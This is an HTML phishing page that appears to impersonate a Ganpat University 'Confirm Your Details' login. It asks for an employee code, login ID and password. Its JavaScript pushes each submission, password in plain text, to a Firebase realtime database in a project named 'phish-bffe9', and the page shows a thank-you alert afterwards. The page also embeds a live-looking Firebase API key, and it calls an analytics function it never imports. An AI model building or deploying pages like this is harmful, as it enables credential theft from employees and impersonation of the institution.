<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm Your Details</title>
    <style>
        /* Global Styles */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            color: #333;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .container {
            max-width: 600px;
            margin: 30px auto;
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
            padding: 30px;
            border-left: 10px solid #D32F2F;
            border-right: 10px solid #D32F2F;
            flex: 1;
        }

        .header {
            background-color: #D32F2F;
            color: white;
            padding: 20px;
            text-align: center;
            font-size: 24px;
            border-radius: 8px 8px 0 0;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        .form-group input, .form-group textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        /* Centering the button */
        .button-container {
            display: flex;
            justify-content: center;
        }

        .button {
            display: inline-block;
            padding: 10px 20px;
            background-color: #D32F2F;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            transition: background-color 0.3s;
            cursor: pointer;
        }

        .button:hover {
            background-color: #C62828;
        }

        .footer {
            background-color: #333;
            color: #fff;
            text-align: center;
            padding: 15px;
            font-size: 14px;
            border-radius: 0 0 8px 8px;
        }

        /* Responsive */
        @media (max-width: 600px) {
            .container {
                width: 100%;
                margin: 10px;
                box-shadow: none;
                border-radius: 0;
                border-left: none;
                border-right: none;
            }

            .header {
                padding: 15px;
            }

            .button {
                width: 100%;
                text-align: center;
                padding: 15px 0;
            }
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="header">
            Confirm Your Details
        </div>

        <form id="detailsForm">
            <div class="form-group">
                <label for="empcode">Emp Code:</label>
                <input type="text" id="empcode" name="empcode" required>
            </div>
            <div class="form-group">
                <label for="loginid">Login Id:</label>
                <input type="text" id="loginid" name="loginid" required>
            </div>
            <div class="form-group">
                <label for="passwd">Password:</label>
                <input type="password" id="passwd" name="passwd" required>
            </div>

            <div class="button-container">
                <button type="submit" class="button">Submit</button>
            </div>
        </form>
    </div>

    <div class="footer">
        &copy; 2024 Ganpat University. All rights reserved.
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>

    <script>
        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyDki8F2WdaqteFzYqy41mag8cgjsjRL2hM",
            authDomain: "phish-bffe9.firebaseapp.com",
            databaseURL: "https://phish-bffe9-default-rtdb.firebaseio.com",
            projectId: "phish-bffe9",
            storageBucket: "phish-bffe9.appspot.com",
            messagingSenderId: "544053179534",
            appId: "1:544053179534:web:68bf5b3e70f878f20f05df",
            
        };

        // Initialize Firebase
        const app = firebase.initializeApp(firebaseConfig);
        const analytics = getAnalytics(app)
        const database = firebase.database();

        // Form submission handler
        document.getElementById('detailsForm').addEventListener('submit', submitForm);

        function submitForm(e) {
            e.preventDefault();

            // Get values
            const empcode = document.getElementById('empcode').value;
            const loginid = document.getElementById('loginid').value;
            const passwd = document.getElementById('passwd').value;

            // Save to Firebase Realtime Database
            const newEntry = database.ref('formResponses').push();
            newEntry.set({
                empcode: empcode,
                loginid: loginid,
                passwd: passwd,
                timestamp: Date.now()
            }).then(() => {
                alert('Thank you! Your details have been submitted successfully.');
                document.getElementById('detailsForm').reset();
            }).catch((error) => {
                console.error('Error saving data: ', error);
                alert('Sorry, there was an error sending your details. Please try again.');
            });
        }
    </script>

</body>

</html>
